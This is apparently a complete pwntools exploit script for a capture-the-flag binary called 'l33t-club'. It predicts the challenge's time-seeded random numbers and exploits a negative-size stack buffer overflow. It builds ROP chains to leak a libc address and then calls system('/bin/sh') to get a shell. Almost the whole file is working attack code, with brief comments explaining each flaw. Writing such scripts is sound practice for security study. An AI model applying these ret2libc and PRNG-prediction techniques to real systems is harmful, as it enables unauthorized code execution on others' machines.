#!/usr/bin/env python3
from pwn import *
import ctypes

elf = ELF("./challenge/l33t-club")
remote_libc = ELF("./libc-2.31.so")

HOST, PORT = "localhost", 1337

context.binary = elf
context.terminal = ["tmux", "splitw", "-h",
                    "-p", "75"]  # for debugging with gdb
context.timeout = 5  # 5 seconds of timeout for blocking operations like recv


def main():
    global io, libc, libc_funcs
    pad = 0x40
    elfrop = ROP(elf)
    pop_rdi = elfrop.find_gadget(["pop rdi", "ret"]).address
    ret = elfrop.find_gadget(["ret"]).address

    io = conn()

    libc_funcs = ctypes.cdll.LoadLibrary(libc.path)

    # Stage 1 (predict random numbers)

    # vulnerability:
    # the random numbers are generated using a predictable
    # seed (srand(time(NULL))), we can generate the same set
    # using the python C API for executing libc functions

    libc_funcs.srand(libc_funcs.time(0))
    for i in range(5):
        guess = predict_num()
        log.info(f"Guess {i} : {guess}")
        io.sendafter("> ", f"{guess}")

    # Stage 2 (l33t function)

    # vulnerability:
    # when sending size < 0, it passes the bounds check
    # and enables writing a large number of bytes to the buffer
    # because read_str accepts an unsigned int as a size parameter,
    # which results in a stack buffer overflow

    # leak libc pointer

    io.sendafter("Enter size: ", "-1")
    payload = flat(
        b'A'*(pad+8),  # reach padding + fake BP (base pointer)
        pop_rdi,
        elf.got.printf,
        elf.plt.puts,  # call: puts printf@got
        elf.sym.l33t  # return address
    )
    io.sendafter("Enter name: ", payload)

    io.recvline()
    leak = u64(io.recvline().rstrip().ljust(8, b"\x00"))
    log.info(f"libc leak: 0x{leak:x}")
    libc.address = leak - libc.sym.printf
    log.info(f"libc base: 0x{libc.address:x}")

    # pop a shell

    io.sendafter("Enter size: ", "-1")
    payload = flat(
        b'A'*(pad+8),
        pop_rdi,
        next(libc.search(b"/bin/sh\x00")),
        ret,  # for stack alignment
        libc.sym.system  # call: system @"/bin/sh\x00"
    )
    io.sendafter("Enter name: ", payload)

    io.interactive()


def predict_num():
    min_ = random_num(0x0, 0x1337)
    max_ = min_ + random_num(0x0, 0x1337)
    return random_num(min_, max_)


def random_num(min_, max_):
    a = min_ + libc_funcs.rand() % (max_+1 - min_)
    b = min_ + libc_funcs.rand() % (max_+1 - min_)
    num = (a ^ b) % (max_+1)
    libc_funcs.srand(num)
    return num


def conn():
    global libc
    gdbscript = '''
    '''
    if args.REMOTE:
        libc = remote_libc
        return remote(HOST, PORT)
    else:
        libc = elf.libc
        p = process([elf.path])
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
        return p


if __name__ == "__main__":
    io = None
    libc = None
    try:
        main()
    finally:
        if io:
            io.close()
